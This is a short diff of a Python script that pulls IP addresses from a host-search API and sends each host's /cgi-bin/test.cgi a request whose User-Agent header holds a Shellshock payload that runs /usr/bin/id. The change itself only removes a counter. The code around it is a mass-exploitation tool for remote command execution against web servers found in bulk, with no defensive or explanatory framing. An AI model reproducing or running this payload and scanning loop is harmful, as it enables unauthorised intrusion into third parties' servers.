@@ -92,12 +92,9 @@ def search(API_URL,UID,SECRET,page,pages):
         pages += 1
 
 def build_url(res_json):
-    c= 0
     for info in res_json['results']:
         full_url = 'http://'+info['ip']+'/cgi-bin/test.cgi'
         test_conn(full_url)
-        c += 1
-    print c
 
 def test_conn(url):
     user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}
